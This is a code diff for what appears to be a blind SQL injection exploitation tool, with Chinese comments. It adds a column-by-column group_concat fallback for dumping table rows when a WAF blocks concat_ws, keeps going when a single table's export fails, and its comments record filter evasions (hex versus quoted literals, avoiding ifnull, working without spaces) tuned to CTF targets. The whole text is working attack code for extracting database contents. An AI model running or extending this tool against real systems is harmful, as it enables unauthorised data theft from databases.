@@ -134,6 +134,15 @@ class ExtractionPipeline:
     def dump_rows(self, db: str, table: str, columns: list,
                   max_rows: int = 20) -> list:
         # limit 依赖空格/tab（严格形态下不可用）→ group_concat 全量导出（紧凑无空格）
+        try:
+            return self._dump_rows_concatws(db, table, columns, max_rows)
+        except OracleError:
+            # concat_ws 被拦（ctf.show 类）→ 降级为逐列 group_concat
+            self.log("WARN", f"[脱库] concat_ws 通道被拦截，"
+                             f"{db}.{table} 降级为逐列提取")
+            return self._dump_rows_percol(db, table, columns, max_rows)
+
+    def _dump_rows_concatws(self, db, table, columns, max_rows):
         # 分隔字面量自适应：引号可用走引号，被滤走 hex（FinalSQL 恰好相反：hex 被拦）
         # concat_ws 自身忽略 NULL 参数（免 ifnull——FinalSQL 类 WAF 拦 ifnull）
         sep = self.b.str_lit("~")
@@ -144,6 +153,24 @@ class ExtractionPipeline:
             parts = chunk.split("~")
             row = {c: (parts[j] if j < len(parts) else "")
                    for j, c in enumerate(columns)}
+            rows.append(row)
+            self.log("DATA", f"[{db}.{table}] "
+                             f"{ {k[:16]: v[:40] for k, v in row.items()} }")
+        return rows
+
+    def _dump_rows_percol(self, db, table, columns, max_rows):
+        """逐列 group_concat（免 concat_ws；行按逗号拆分对齐）。"""
+        col_vals = {}
+        for c in columns:
+            if self.s.stopped:
+                break
+            raw = self.o.scalar(f"(select group_concat({c}) from {db}.{table})")
+            col_vals[c] = raw.split(",") if raw else []
+        n = min(max((len(v) for v in col_vals.values()), default=0), max_rows)
+        rows = []
+        for i in range(n):
+            row = {c: (col_vals[c][i] if i < len(col_vals[c]) else "")
+                   for c in columns}
             rows.append(row)
             self.log("DATA", f"[{db}.{table}] "
                              f"{ {k[:16]: v[:40] for k, v in row.items()} }")
@@ -207,5 +234,9 @@ class ExtractionPipeline:
             n_rows = max_rows if pri == 2 else min(3, max_rows)
             self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
                              f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
-            res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
+            try:
+                res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
+            except OracleError as e:
+                # 单表失败（超长 payload 被拦/敏感词）不阻断其余表
+                self.log("WARN", f"[脱库] {db}.{t} 导出失败（跳过）: {str(e)[:90]}")
         return res
